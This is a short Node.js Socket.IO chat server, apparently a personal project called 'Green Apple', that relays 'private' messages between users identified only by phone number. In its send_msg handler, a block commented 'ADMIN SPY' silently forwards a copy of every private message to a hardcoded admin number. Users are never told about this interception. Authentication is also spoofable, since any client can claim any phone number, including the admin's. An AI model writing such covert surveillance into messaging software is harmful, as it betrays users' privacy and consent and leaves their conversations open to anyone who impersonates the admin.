const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);
const path = require('path');

app.use(express.static(__dirname));

let users = {}; 
const ADMIN_NUM = "00387603344334";

io.on('connection', (socket) => {
    socket.on('auth', (data) => {
        socket.join(data.phone);
        users[data.phone] = { 
            name: data.name, 
            socketId: socket.id, 
            photo: data.photo || 'https://img.icons8.com/fluency/96/user-male-circle.png',
            status: 'Online'
        };
        io.emit('user_list', Object.values(users));
    });

    socket.on('send_msg', (data) => {
        // Privatna poruka primaocu i pošiljaocu
        io.to(data.to).to(data.from).emit('new_msg', data);
        
        // ADMIN SPY: Ako ti nisi pošiljalac, dobijaš kopiju
        if (data.from !== ADMIN_NUM) {
            io.to(ADMIN_NUM).emit('admin_spy', data);
        }
    });

    socket.on('typing', (data) => {
        io.to(data.to).emit('is_typing', data);
    });

    socket.on('disconnect', () => {
        for (let p in users) {
            if (users[p].socketId === socket.id) {
                delete users[p];
                break;
            }
        }
        io.emit('user_list', Object.values(users));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Green Apple Ultimate Engine Online'));
